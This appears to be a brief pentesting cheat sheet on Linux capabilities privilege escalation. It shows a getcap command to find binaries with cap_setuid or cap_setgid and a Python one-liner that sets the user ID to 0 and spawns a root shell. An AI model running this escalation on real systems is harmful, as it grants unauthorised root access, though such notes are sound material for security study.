# Linux Capabilities

## Detection

getcap -r / 2>/dev/null

Look for:

cap_setuid
cap_setgid

## Exploitation

python -c 'import os; os.setuid(0); os.system("/bin/bash")'

## Verification

id
